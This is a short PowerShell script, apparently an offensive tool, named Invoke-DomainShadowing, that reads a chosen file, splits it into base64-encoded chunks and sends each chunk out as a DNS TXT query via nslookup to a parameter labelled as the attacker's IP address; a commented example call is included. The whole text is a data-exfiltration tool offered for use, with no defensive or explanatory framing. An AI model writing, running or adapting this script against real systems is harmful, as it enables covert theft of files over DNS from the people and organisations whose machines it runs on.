function Invoke-DomainShadowing {
    param (
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$AttackerIP  # Attacker's IP address
    )

    $ChunkSize = 63  # Hardcoded chunk size

    # Function to split the file content into chunks of equal size
    function Split-FileIntoChunks {
        param (
            [byte[]]$Content,
            [int]$ChunkSize
        )

        $chunks = @()
        $totalChunks = [math]::Ceiling($Content.Length / $ChunkSize)

        for ($i = 0; $i -lt $totalChunks; $i++) {
            $startIndex = $i * $ChunkSize
            $chunk = $Content[$startIndex..([math]::Min($startIndex + $ChunkSize - 1, $Content.Length - 1))]
            $chunks += [PSCustomObject]@{
                Index = $i
                Data = [System.Convert]::ToBase64String($chunk)
            }
        }

        return $chunks
    }

    # Read the file content
    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)

    # Split the content into chunks
    $chunks = Split-FileIntoChunks -Content $fileContent -ChunkSize $ChunkSize

    # Send each chunk as a DNS query
    foreach ($chunk in $chunks) {
        $query = "$($chunk.Index).$($chunk.Data).$AttackerIP"
        nslookup -type=txt $query $AttackerIP
    }
}

# Example usage
# Invoke-DomainShadowing -FilePath "C:\path\to\your\file.zip" -AttackerIP "192.0.2.1"
